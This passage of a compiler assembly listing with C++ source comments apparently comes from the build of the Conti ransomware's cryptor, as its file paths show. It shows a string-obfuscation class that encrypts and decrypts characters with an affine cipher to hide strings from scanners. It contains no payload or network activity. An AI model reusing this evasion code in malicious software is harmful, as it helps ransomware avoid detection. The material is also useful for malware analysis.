	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEBA_NXZ ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 3a	 cmp	 QWORD PTR i$1[rbp], 58	; 0000003aH
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEBA_NXZ PROC ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv504 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
